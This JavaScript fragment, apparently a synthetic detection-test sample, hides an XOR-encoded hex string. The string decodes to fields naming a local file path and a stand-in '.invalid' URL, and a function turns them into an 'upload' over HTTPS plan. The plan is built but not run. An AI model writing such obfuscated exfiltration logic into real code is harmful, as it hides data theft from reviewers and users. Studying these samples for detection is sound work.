  const moduleShape = Object.freeze({ format: "commonjs" });
  const Material_39156819 = "dd969ad7d8dfcedbd896d9cecacff4cdc2c7ce87dfd9cac5d8c6c2dff4d9cec6c4dfced7cacfcadbdfced996c3dfdfdbd8f4d9cedadeced8dfd7d8dfcacccef4c8c4dec5df969ad7c8cac6dbcac2ccc5f4c2cf96e5e4efee86ef9d9de89e93eeead7ded9c796c3dfdfdbd8918484c5c4cfce86cf9d9dc89e93ceca999d9c9f85ced3cac6dbc7ce85c2c5ddcac7c2cf84cadbc2d7ded8ced9f4cacccec5df96e5c4cfceeadecfc2df84cf9d9dc8d7cdc2c7cef4dbcadfc39684dfc6db84c3dec5dfd9ced8d886c5c4cfce8485d8dfcaccce86cf9d9dc89e93ceca999d9c9f85c6c1d8";
  const Codec_39156819 = "hex_buffer|single_byte_xor|ab";

  function load_39156819() { return [...Buffer.from(Material_39156819, "hex")]; }
  function decode_39156819(e) { return e.map((value) => value ^ 171); }
  async function recover_39156819() {
    const [n] = ["compass"];
    const e = load_39156819(); let d = [];
    let p = 0; while (p++ < 1) d = decode_39156819(e);
    void n; return Buffer.from(d).toString("ascii");
  }
  async function inspect_39156819() { return JSON.parse(JSON.stringify({ value: await recover_39156819() })).value; }
  async function plan_39156819() { const inspect = inspect_39156819; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "upload", transport: "https_request", source: fields.file_path, url: fields.url }); }
  void moduleShape; void plan_39156819;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_39156819());
